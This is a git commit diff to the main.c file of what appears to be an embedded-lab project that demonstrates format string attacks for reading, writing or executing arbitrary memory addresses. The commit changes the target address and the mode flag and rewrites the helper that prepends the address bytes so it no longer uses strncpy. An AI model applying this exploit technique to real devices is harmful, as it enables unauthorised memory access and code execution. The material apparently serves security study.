00bb8de316f986bddae5327b74b90d0ad0d7816c
esplab <peabryan95@gmail.com>
2021-02-01 18:33:14 -0500

    removed strncpy which suffers from null byte issue

--- main/main.c
+++ main/main.c
@@ -6,22 +6,20 @@
 	Use this project to read, write, or execute any address you want via the format string attack. There are caveats of course. Not every address has read, write, or execute access. And the format string attack cannot work with null bytes (0x00). In the case of read/write, this means TARGET_ADDRESS needs to avoid the null byte. For execute, this means ret_addr (the return address of app_main) needs to avoid the null byte.
 */
 
-// #define READ_ADDRESS
+#define READ_ADDRESS
 // #define WRITE_ADDRESS
-#define EXEC_ADDRESS
+// #define EXEC_ADDRESS
 
 // For R/W, this is the address we read or write
 // For X, this is the address we jump to and (try to) execute
-#define TARGET_ADDRESS 0x12345678
+#define TARGET_ADDRESS 0x3ff00044
 
 void prependAddr(char* input, int target_address)
 {
-	char addr[4];
-	addr[3] = (target_address >> 24) & 0xff;
-	addr[2] = (target_address >> 16) & 0xff;
-	addr[1] = (target_address >> 8) & 0xff;
-	addr[0] = target_address & 0xff;
-	strncpy(input, addr, 4);
+	input[3] = (target_address >> 24) & 0xff;
+	input[2] = (target_address >> 16) & 0xff;
+	input[1] = (target_address >> 8) & 0xff;
+	input[0] = target_address & 0xff;
 }
 
 void read_address()
